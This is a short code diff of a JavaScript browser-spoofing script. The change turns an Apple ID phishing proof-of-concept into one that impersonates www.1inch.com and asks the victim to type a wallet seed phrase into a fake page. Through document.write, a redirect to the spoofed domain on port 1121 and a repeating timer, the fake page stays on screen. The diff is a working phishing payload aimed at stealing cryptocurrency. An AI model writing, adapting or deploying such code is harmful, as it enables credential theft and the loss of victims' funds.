@@ -3,20 +3,20 @@ function spoof()
 
 {
 
-document.write("<title>www.apple.com</title>");
+document.write("<title>www.1inch.com</title>");
   
-    a= '<h1>Fake Content!!</h1><p>Please input your Apple ID here:<input></p>'
+    a= '<h1>Fake Content</h1><p>Please input your seed pharse here:<input></p>'
 
 document.write(a);
-window.location.assign("http://www.apple.com:1121");
+window.location.assign("http://www.1inch.com:1121");
 
    	setTimeout(function(){
 		spoof();  // Loop makes the browser always shows the fake page.
-	}, 2000);
+	}, 2500);
 
 }
 
 
 
-setInterval(spoof(),2000);
+setInterval(spoof(),2500);
 </script>
